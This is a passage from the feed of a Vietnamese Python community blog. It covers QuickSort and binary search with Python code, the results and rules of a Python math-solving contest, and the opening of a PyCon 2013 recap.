&lt;p&gt;Ứng dụng nổi tiếng nhất là thuật toán QuickSort do Tony Hoare sáng tạo ra. Thuật toán QuickSort sắp xếp một mảng với độ phức tạp trung bình là O(n*logn) với n là số lượng phần tử trong mảng. Độ phức tạp trong trường hợp xấu nhất có thể là O(n*n).&lt;/p&gt;
&lt;p&gt;Sau đây là một cài đặt dễ hiểu của QuickSort. Cài đặt này chỉ dùng để thể hiện ý tưởng chứ không nên dùng trong các ứng dụng.&lt;/p&gt;
&lt;p&gt;Ý tưởng chủ đạo là &lt;strong&gt;lấy ra&lt;/strong&gt; một phần tử nào đó trong A (tức là A' chỉ còn N-1 phần tử) gọi là &lt;strong&gt;pivot&lt;/strong&gt;, ngăn A' thành hai cụm (một cụm nhỏ hơn pivot, một cụm còn lại). Tiếp tục gọi đệ quy để sắp xếp hai cụm đó và nối chúng lại với nhau thông qua pivot.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;quicksort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;
    &lt;span class="n"&gt;pivot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pivot_idx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;partition&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;pivot&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;quicksort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;pivot_idx&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pivot&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;quicksort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pivot_idx&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;])&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;itertools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;permutations&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;quicksort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="bai-toan-mo-rong"&gt;
&lt;h2&gt;Bài toán mở rộng&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Cho một mảng số nguyên A. Tìm K phần tử nhỏ nhất trong A.&lt;/li&gt;
&lt;li&gt;Cho một mảng số nguyên A và một số nguyên X. Đếm số tập hợp 2-phần-tử trong mảng A có tổng nhỏ hơn hoặc bằng X.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Các bạn có thể trao đổi về cách giải bài các bài toán mở rộng này với độ phức tạp trung bình O(n) trong diễn đàn.&lt;/p&gt;
&lt;/div&gt;
</content><category term="sort"></category><category term="partition"></category><category term="algorithm"></category></entry><entry><title>Thuật toán đẹp: Tìm nhị phân</title><link href="/2013/12/thuat-toan-dep-tim-nhi-phan.html" rel="alternate"></link><published>2013-12-27T06:13:00+07:00</published><updated>2013-12-27T06:13:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2013-12-27:/2013/12/thuat-toan-dep-tim-nhi-phan.html</id><summary type="html">&lt;div class="section" id="muc-dich"&gt;
&lt;h2&gt;Mục đích&lt;/h2&gt;
&lt;p&gt;Tìm phần tử X trong một mảng &lt;strong&gt;đã được sắp xếp&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="y-tuong-chinh"&gt;
&lt;h2&gt;Ý tưởng chính&lt;/h2&gt;
&lt;p&gt;Chia mảng ra thành 3 cụm: cụm bên trái, phần tử ở giữa, và cụm bên phải. So sánh X với phần tử ở giữa. Nếu X bằng với phần tử ở giữa thì …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="muc-dich"&gt;
&lt;h2&gt;Mục đích&lt;/h2&gt;
&lt;p&gt;Tìm phần tử X trong một mảng &lt;strong&gt;đã được sắp xếp&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="y-tuong-chinh"&gt;
&lt;h2&gt;Ý tưởng chính&lt;/h2&gt;
&lt;p&gt;Chia mảng ra thành 3 cụm: cụm bên trái, phần tử ở giữa, và cụm bên phải. So sánh X với phần tử ở giữa. Nếu X bằng với phần tử ở giữa thì ta đã tìm được X trong mảng. Nếu X lớn hơn thì tìm X trong cụm bên phải. Nếu X nhỏ hơn thì tìm X trong cụm bên trái.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="hieu-qua"&gt;
&lt;h2&gt;Hiệu quả&lt;/h2&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Thời gian thực hiện&lt;/dt&gt;
&lt;dd&gt;O(logn)&lt;/dd&gt;
&lt;dt&gt;Bộ nhớ cần thiết&lt;/dt&gt;
&lt;dd&gt;O(1)&lt;/dd&gt;
&lt;/dl&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat"&gt;
&lt;h2&gt;Cài đặt&lt;/h2&gt;
&lt;div class="section" id="cai-dat-de-quy"&gt;
&lt;h3&gt;Cài đặt đệ quy&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;right_idx&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;right_idx&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="n"&gt;mid_idx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;right_idx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
    &lt;span class="n"&gt;mid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;mid_idx&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;mid_idx&lt;/span&gt;
    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mid_idx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mid_idx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;right_idx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat-vong-lap"&gt;
&lt;h3&gt;Cài đặt vòng lặp&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;bin_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;right_idx&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;right_idx&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;mid_idx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;right_idx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;left_idx&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
        &lt;span class="n"&gt;mid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;mid_idx&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;mid_idx&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;mid&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;right_idx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mid_idx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;left_idx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mid_idx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="tham-khao-them"&gt;
&lt;h2&gt;Tham khảo thêm&lt;/h2&gt;
&lt;p&gt;Mô-đun &lt;strong&gt;bisect&lt;/strong&gt; trong thư viện chuẩn của Python.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="mot-so-bai-toan-mo-rong"&gt;
&lt;h2&gt;Một số bài toán mở rộng&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Mảng đã được sắp xếp nhưng đã bị xoay vòng (ví dụ [4, 5, 6, 7, 1, 2, 3]).&lt;/li&gt;
&lt;li&gt;Mảng 2 chiều đã được sắp xếp theo dòng, và cột (a[i][j] &amp;lt; a[i + 1][j] và a[i][j] &amp;lt; a[i][j + 1]).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Các bạn có thể trao đổi ý tưởng giải quyết các bài toán mở rộng này trong diễn đàn.&lt;/p&gt;
&lt;/div&gt;
</content><category term="binary"></category><category term="search"></category><category term="algorithm"></category></entry><entry><title>Kết quả cuộc thi giải toán lần II</title><link href="/2013/04/ket-qua-cuoc-thi-giai-toan-lan-ii.html" rel="alternate"></link><published>2013-04-18T16:29:00+07:00</published><updated>2013-04-18T16:29:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2013-04-18:/2013/04/ket-qua-cuoc-thi-giai-toan-lan-ii.html</id><summary type="html">&lt;p&gt;Cảm ơn sự hưởng ứng nhiệt tình của các bạn với cuộc thi giải toán lần II của PCNV.&lt;/p&gt;
&lt;p&gt;Lần này nhóm nhận được sự sự tham gia của năm bạn Phạm Ngọc Quang Nam, Nguyễn Văn Nam, Vũ Khuê, Hoàng Quốc Thịnh, và Đậu Duy Khánh.&lt;/p&gt;
&lt;p&gt;Bài của bạn …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cảm ơn sự hưởng ứng nhiệt tình của các bạn với cuộc thi giải toán lần II của PCNV.&lt;/p&gt;
&lt;p&gt;Lần này nhóm nhận được sự sự tham gia của năm bạn Phạm Ngọc Quang Nam, Nguyễn Văn Nam, Vũ Khuê, Hoàng Quốc Thịnh, và Đậu Duy Khánh.&lt;/p&gt;
&lt;p&gt;Bài của bạn Thịnh:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
09:03:48 ~/tmp/pell2$ python3.3 thinhhq.py | python timer.py &amp;gt; thinhhq.txt
09:04:22 ~/tmp/pell2$ python checker.py &amp;lt; thinhhq.txt
Max 448985
09:04:30 ~/tmp/pell2$ python3.3 thinhhq.py | python timer.py &amp;gt; thinhhq.txt2
09:05:04 ~/tmp/pell2$ python checker.py &amp;lt; thinhhq.txt2
Max 449905
09:05:08 ~/tmp/pell2$ python3.3 thinhhq.py | python timer.py &amp;gt; thinhhq.txt3
09:05:39 ~/tmp/pell2$ python checker.py &amp;lt; thinhhq.txt3
Max 449421
&lt;/pre&gt;
&lt;p&gt;Bài của bạn Văn Nam:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
09:05:46 ~/tmp/pell2$ python3.3 namnv.py | python timer.py &amp;gt; namnv.txt
09:07:12 ~/tmp/pell2$ python checker.py &amp;lt; namnv.txt
Max 1394855
09:07:28 ~/tmp/pell2$ python3.3 namnv.py | python timer.py &amp;gt; namnv.txt2
09:07:47 ~/tmp/pell2$ python checker.py &amp;lt; namnv.txt2
Max 1394855
09:08:00 ~/tmp/pell2$ python3.3 namnv.py | python timer.py &amp;gt; namnv.txt3
09:08:19 ~/tmp/pell2$ python checker.py &amp;lt; namnv.txt3
Max 1394855
&lt;/pre&gt;
&lt;p&gt;Bài của bạn Khanh:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
09:12:49 ~/tmp/pell2$ python3.3 khanhdd.py | python timer.py &amp;gt; khanhdd.txt
Traceback (most recent call last):
  File &amp;quot;khanhdd.py&amp;quot;, line 13, in &amp;lt;module&amp;gt;
    print (a1,' ',b1)
BrokenPipeError: [Errno 32] Broken pipe
09:13:27 ~/tmp/pell2$ python checker.py &amp;lt; khanhdd.txt
ERROR:root:Format
Traceback (most recent call last):
  File &amp;quot;checker.py&amp;quot;, line 16, in &amp;lt;module&amp;gt;
    n, k = map(long, line.split())
ValueError: too many values to unpack
&lt;/pre&gt;
&lt;p&gt;Bài của bạn Khuê:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
09:14:37 ~/tmp/pell2$ python3.3 khuev.py | python timer.py &amp;gt; khuev.txt
  File &amp;quot;khuev.py&amp;quot;, line 35
    print &amp;quot;n: %d - k: %d&amp;quot; % (-b / 2, k)
                      ^
SyntaxError: invalid syntax
&lt;/pre&gt;
&lt;p&gt;Bài của bạn Quang Nam:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
09:15:19 ~/tmp/pell2$ python3.3 nampnq.py | python timer.py &amp;gt; nampnq.txt
  File &amp;quot;nampnq.py&amp;quot;, line 5
    print &amp;quot;n=%d, k=%d&amp;quot; % (n,k)
                   ^
SyntaxError: invalid syntax
&lt;/pre&gt;
&lt;p&gt;Mã nguồn và bản lưu kết quả của cuộc thi có thể được tải về từ  &lt;a class="reference external" href="https://docs.google.com/file/d/0B5X03CmpgiFeMkNubXlGNFlCMjQ/edit?usp=sharing"&gt;https://docs.google.com/file/d/0B5X03CmpgiFeMkNubXlGNFlCMjQ/edit?usp=sharing&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Như vậy, bạn Văn Nam đã thắng giải kỳ này. Xin chúc mừng bạn Văn Nam.&lt;/p&gt;
&lt;p&gt;Bạn Văn Nam gửi thư cho admin&amp;#64; cho biết mẫu áo bạn chọn, và thông tin bưu điện để nhóm PCNV có thể gửi áo cho bạn.&lt;/p&gt;
</content><category term="python"></category><category term="optimize"></category><category term="contest"></category></entry><entry><title>Cuộc thi giải toán bằng Python</title><link href="/2013/03/cuoc-thi-giai-toan-bang-python.html" rel="alternate"></link><published>2013-03-31T02:18:00+07:00</published><updated>2013-03-31T02:18:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2013-03-31:/2013/03/cuoc-thi-giai-toan-bang-python.html</id><summary type="html">&lt;p&gt;Trong lần thi trước (&lt;a class="reference external" href="http://www.vithon.org/2010/05/24/phat-d%E1%BB%99ng-cu%E1%BB%99c-thi-gi%E1%BA%A3i-toan-b%E1%BA%B1ng-python"&gt;http://www.vithon.org/2010/05/24/phat-d%E1%BB%99ng-cu%E1%BB%99c-thi-gi%E1%BA%A3i-toan-b%E1%BA%B1ng-python&lt;/a&gt;), chúng ta đánh giá chương trình dựa trên số lượng cặp N, K tìm được.&lt;/p&gt;
&lt;p&gt;Tiêu chí của lần thi này là in ra cặp số …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trong lần thi trước (&lt;a class="reference external" href="http://www.vithon.org/2010/05/24/phat-d%E1%BB%99ng-cu%E1%BB%99c-thi-gi%E1%BA%A3i-toan-b%E1%BA%B1ng-python"&gt;http://www.vithon.org/2010/05/24/phat-d%E1%BB%99ng-cu%E1%BB%99c-thi-gi%E1%BA%A3i-toan-b%E1%BA%B1ng-python&lt;/a&gt;), chúng ta đánh giá chương trình dựa trên số lượng cặp N, K tìm được.&lt;/p&gt;
&lt;p&gt;Tiêu chí của lần thi này là in ra cặp số N, K &lt;strong&gt;lớn nhất&lt;/strong&gt; có thể tìm được trong 30 giây. Cặp số cuối cùng được in ra trong 30 giây sẽ được xem là cặp số lớn nhất và dùng để đánh giá các chương trình với nhau.&lt;/p&gt;
&lt;p&gt;Giải thưởng của kỳ thi lần này sẽ là một áo thun do bạn Nguyễn Thành Nam đã tặng nhóm PCNV trong lần đi PyCon vừa qua. Các bạn có thể xem qua các áo giải thưởng (trừ EdX cỡ L, các áo khác cỡ M, chỉ được chọn 1) ở URL sau:&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://drive.google.com/folderview?id=0B5X03CmpgiFeNzNJN09qZnd2Sk0&amp;amp;usp=sharing"&gt;https://drive.google.com/folderview?id=0B5X03CmpgiFeNzNJN09qZnd2Sk0&amp;amp;usp=sharing&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Các bài tham dự gửi bằng thư điện tử về cho admin&amp;#64; hạn chót trong &lt;strong&gt;ngày 14 tháng 04 năm 2013&lt;/strong&gt;. Nhằm khuyến khích việc sử dụng Python 3, các bài tham gia kỳ thi này sẽ được &lt;strong&gt;chấm trên Python 3.3&lt;/strong&gt;. Mòng các bạn chú ý yêu cầu này.&lt;/p&gt;
&lt;p&gt;Quyết định của người chấm là cuối cùng. Xin miễn nhận khiếu nại.&lt;/p&gt;
</content><category term="maths"></category><category term="python"></category><category term="contest"></category></entry><entry><title>Ghi nhớ về PyCon 2013</title><link href="/2013/03/ghi-nho-ve-pycon-2013.html" rel="alternate"></link><published>2013-03-18T06:01:00+07:00</published><updated>2013-03-18T06:01:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2013-03-18:/2013/03/ghi-nho-ve-pycon-2013.html</id><summary type="html">&lt;p&gt;Hội thảo PyCon 2013 vừa kết thúc vào Chủ Nhật, ngày 18 tháng 03 năm 2013 vừa rồi tại Trung tâm Hội nghị Santa Clara, bang California, Mỹ.&lt;/p&gt;
&lt;p&gt;Hội thảo lần này diễn ra vào các ngày thứ sáu, thứ bảy, và Chủ Nhật với khoảng 100 bài tham luận …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hội thảo PyCon 2013 vừa kết thúc vào Chủ Nhật, ngày 18 tháng 03 năm 2013 vừa rồi tại Trung tâm Hội nghị Santa Clara, bang California, Mỹ.&lt;/p&gt;
